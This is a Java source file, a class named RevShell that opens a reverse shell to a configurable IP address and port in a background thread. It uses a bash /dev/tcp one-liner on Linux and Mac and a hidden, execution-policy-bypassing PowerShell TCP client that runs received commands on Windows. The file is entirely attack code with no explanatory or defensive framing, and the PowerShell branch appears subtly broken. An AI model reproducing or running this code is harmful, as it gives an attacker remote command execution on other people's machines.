public class RevShell {

  private String IP = "127.0.0.1";
  private int port = 9999;
  private String OS = "Mac";

  public void setOS(String os) {
    OS = os;
  }

  public void setIP(String ip) {
    IP = ip;
  }

  public void setPort(int p) {
    port = p;
  }
  
  public void shell() {
    Thread thread = new Thread(){
      public void run(){
        Process p;
        try {
          if (OS.equals("Linux") || OS.equals("Mac")) {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + IP + "/" + port + " 0>&1");
            System.out.println("bash -c $@|bash 0 echo bash -i >& /dev/tcp/" + IP + "/" + port + " 0>&1");
          } else if (OS.equals("Windows")) {
            p = Runtime.getRuntime().exec("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"" + IP + "\"," + port + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
            
          }
        } catch (Exception e) {
          System.out.println(e);
        }
      }
    };
  thread.start();
  }

  public static void main(String[] args) {
    RevShell sh = new RevShell();
    sh.shell();
    while (true) {
      ;
    }
  }
}